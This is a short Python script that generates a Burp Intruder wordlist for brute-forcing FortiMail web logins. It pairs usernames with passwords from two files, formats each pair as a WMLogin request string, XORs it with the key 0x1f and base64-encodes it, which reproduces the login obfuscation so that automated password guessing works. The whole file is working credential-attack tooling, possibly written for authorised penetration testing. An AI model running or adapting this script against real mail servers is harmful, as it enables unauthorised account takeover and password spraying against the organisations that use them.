import argparse
import base64

def create_plaintext_login_string(user_list, pass_list):
    # Read user file into Python list
    with open(user_list, 'r') as file:
        users = file.readlines()
    # Read password file into Python list
    with open(pass_list, 'r') as file:
        passwords = file.readlines()

    # Write results of xor_encode out to file
    with open('intruder_strings.txt', 'w') as file:
        n = 0
        for user in users:
            # Create plaintext string to be XOR'd and encoded
           brute_string = f":54:reqObject=WMLogin&reqAction=1&name={user.strip()}&password={passwords[n].strip()}"
           file.write(xor_encode(brute_string, "1f") + "\n")
           n += 1

def xor_encode(input_string, hex_key):
    # Convert the input string to bytes
    input_bytes = input_string.encode()

    # Convert the hex key to a single byte
    key_byte = bytes.fromhex(hex_key)

    # Repeat the key to match the length of the input string
    repeated_key_bytes = key_byte * len(input_bytes)

    # XOR each byte of the input with the corresponding byte of the repeated key
    xor_result = bytes(a ^ b for a, b in zip(input_bytes, repeated_key_bytes))

    # Base64 encode
    xor_b64_encode = base64.b64encode(xor_result)

    # Convert the result to a string using 'utf-8' encoding to keep all byte values
    xor_result_string = xor_b64_encode.decode('utf-8')

    return xor_result_string

def main():
    parser = argparse.ArgumentParser(description="Create a Burp Intruder wordlist for FortiMail logins.")
    parser.add_argument("user_list", help="File containing usernames/emails newline delimited.")
    parser.add_argument("pass_list", help="File containing passwords newline delimited.")
    args = parser.parse_args()

    create_plaintext_login_string(args.user_list, args.pass_list)

if __name__ == "__main__":
    main()
